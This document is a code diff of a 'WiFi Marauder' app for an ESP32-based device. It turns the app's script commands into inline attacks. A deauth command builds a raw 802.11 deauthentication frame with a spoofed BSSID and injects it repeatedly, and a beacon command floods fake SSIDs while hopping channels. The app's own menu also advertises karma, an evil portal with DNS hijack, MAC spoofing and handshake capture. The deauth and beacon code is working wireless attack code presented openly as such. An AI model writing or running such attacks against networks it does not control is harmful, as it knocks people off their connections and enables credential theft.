-        if (g_open_count == 0) ui_text("No open ports found");
-        ui_button("Rescan", 1);
-        ui_button("< Back", 99);
-        ui_end();
-
-        int ev = ui_wait_event();
-        if (ev == EV_BACK || ev == 99) break;
-        if (ev == 1) {
-            g_open_count = 0;
-            for (int i = 0; i < N_COMMON_PORTS && g_open_count < MAX_OPEN_PORTS; i++) {
-                if (wifi_tcp_probe(g_port_target, kCommonPorts[i], 1500) == 0)
-                    g_open_ports[g_open_count++] = kCommonPorts[i];
-            }
-        }
-    }
-    g_screen = SCR_NET_TOOLS;
+    g_screen = SCR_ATTACKS_MENU;
 }
 
 // ── Scripts ───────────────────────────────────────────────────────────────────
@@ -1830,21 +1847,30 @@ static void screen_scripts(void) {
             while (*p && *p != ' ' && bi < MAX_BSSID_LEN - 1) bssid[bi++] = *p++;
             bssid[bi] = '\0'; while (*p == ' ') p++;
             int ch = 1; p = parse_int(p, &ch);
-            wifi_deauth_start(bssid, ch);
+            unsigned char mac[6];
+            if (parse_hex_mac(bssid, mac)) {
+                unsigned char frame[26] = {
+                    0xC0,0x00,0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+                    0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0x07,0x00 };
+                nema_memcpy(frame + 10, mac, 6); nema_memcpy(frame + 16, mac, 6);
+                for (int t = 0; t < 20; t++) { wifi_inject(ch, frame, 26); delay(20); }
+            }
 
         } else if (str_eq(cmd, "beacon")) {
             int cnt = 0; p = parse_int(p, &cnt);
             if (cnt <= 0 || cnt > DEFAULT_SPAM_COUNT) cnt = DEFAULT_SPAM_COUNT;
-            wifi_beacon_spam_start(kDefaultSpamSsids, cnt);
+            static const int kHop[3] = {1, 6, 11};
+            for (int t = 0; t < 20; t++) {
+                beacon_spam_round(kDefaultSpamSsids, cnt, kHop[t % 3]); delay(50);
+            }
 
         } else if (str_eq(cmd, "wait")) {
             int ms = 0; p = parse_int(p, &ms);
             if (ms > 0 && ms < 60000) delay(ms);
 
         } else if (str_eq(cmd, "stop")) {
-            wifi_deauth_stop();
-            wifi_beacon_spam_stop();
-            wifi_probe_flood_stop();
+            // no-op: bursts above are self-contained; nothing runs in the
+            // background now that attacks live in-app, not as kernel loops.
         }
 
         while (*p && *p != '\n') p++;
@@ -1853,10 +1879,6 @@ static void screen_scripts(void) {
         int key = input_poll();
         if (key == ACT_BACK) break;
     }
-
-    wifi_deauth_stop();
-    wifi_beacon_spam_stop();
-    wifi_probe_flood_stop();
 
     ui_begin();
     ui_title("Script Done");
@@ -1878,19 +1900,19 @@ static void screen_scripts(void) {
 static int screen_about(void) {
     ui_begin();
     ui_title("WiFi Marauder");
-    ui_text("v3.0.0 — Palanu WASM");
-    ui_text("Native ESP32 radio — no external board");
+    ui_text("Version " APP_VERSION);
+    ui_text("Palanu WASM — native ESP32 radio");
     ui_text("");
     ui_text("Attacks:");
     ui_text("  Deauth, Probe Flood, badmsg, Sleep");
     ui_text("  Beacon Spam, Rickroll, Karma");
     ui_text("  Evil Portal (captive + DNS hijack)");
+    ui_text("  MAC Spoof");
     ui_text("Sniff:");
     ui_text("  Beacons, Probes, Deauths, PMKID/EAPOL");
     ui_text("  PCAP save to SD card");
-    ui_text("Network:");
-    ui_text("  ARP Scan, Port Scan, MAC Spoof");
     ui_text("  Scripts from SD card");
+    ui_text("Takes over the WiFi radio while open.");
     ui_text("");
     ui_text("Inspired by Flipper Zero Marauder");
     ui_button("Back", 1);
@@ -1903,18 +1925,24 @@ static int screen_about(void) {
 // ── Entry point ────────────────────────────────────────────────────────────────
 
 NEMA_EXPORT int main(void) {
-    nema_log("info", "WiFiMarauder", "started v3.0");
+    nema_log("info", "WiFiMarauder", "started v" APP_VERSION);
+
+    // Take over the WiFi radio for the whole session. This suspends the system
+    // WiFi connection once (one permission prompt) and holds the radio until the
+    // app exits, so deauth/beacon/sniff/karma/portal switch instantly with no
+    // disconnect/reconnect churn between them. The radio is auto-released on exit.
+    wifi_acquire();
+
     g_screen = SCR_MAIN;
 
     while (1) {
         switch (g_screen) {
             case SCR_MAIN: {
                 int ev = screen_main();
-                if (ev == EV_BACK)          return 0;
+                if (ev == EV_BACK)          { wifi_release(); return 0; }
                 if (ev == MMENU_SCAN)       g_screen = SCR_SCANNING;
                 if (ev == MMENU_SNIFF)      g_screen = SCR_SNIFF_MENU;
                 if (ev == MMENU_ATTACKS)    g_screen = SCR_ATTACKS_MENU;
-                if (ev == MMENU_NET)        g_screen = SCR_NET_TOOLS;
                 if (ev == MMENU_SCRIPTS)    g_screen = SCR_SCRIPTS;
                 if (ev == MMENU_ABOUT)      g_screen = SCR_ABOUT;
                 break;
@@ -1938,9 +1966,6 @@ NEMA_EXPORT int main(void) {
             case SCR_MAC_SPOOF:      screen_mac_spoof();      break;
             case SCR_KARMA:          screen_karma();          break;
             case SCR_EVIL_PORTAL:    screen_evil_portal();    break;
-            case SCR_NET_TOOLS:      screen_net_tools();      break;
-            case SCR_NET_SCAN:       screen_net_scan();       break;
-            case SCR_PORT_SCAN:      screen_port_scan();      break;
             case SCR_SCRIPTS:        screen_scripts();        break;
             default: g_screen = SCR_MAIN; break;
         }
